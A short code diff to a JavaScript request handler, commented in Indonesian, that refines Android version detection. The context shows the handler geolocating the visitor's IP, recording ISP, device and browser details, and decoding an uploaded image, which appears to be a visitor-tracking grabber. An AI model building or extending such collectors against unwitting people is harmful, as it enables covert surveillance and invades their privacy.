@@ -26,6 +26,20 @@ export default async function handler(req, res) {
     const browserName = browser.name || "Browser tidak diketahui";
     const browserVersion = browser.version || "Versi tidak diketahui";
 
+    // Memperbaiki deteksi Android versi lebih lengkap
+    let androidVersion = "";
+    if (osName === "Android") {
+      const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
+      if (androidMatch) {
+        androidVersion = androidMatch[1];
+      }
+    }
+
+    // Jika tidak ada versi Android terdeteksi, fallback ke default
+    if (!androidVersion) {
+      androidVersion = osVersion || "Tidak diketahui";
+    }
+
     const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
     const ipInfo = await ipInfoRes.json();
 
@@ -51,7 +65,7 @@ ISP: ${isp}
 Jam: ${waktu}
 
 Perangkat: ${deviceInfo}
-OS: ${osName} ${osVersion}
+OS: ${osName} ${androidVersion}
 Browser: ${browserName} ${browserVersion}`;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
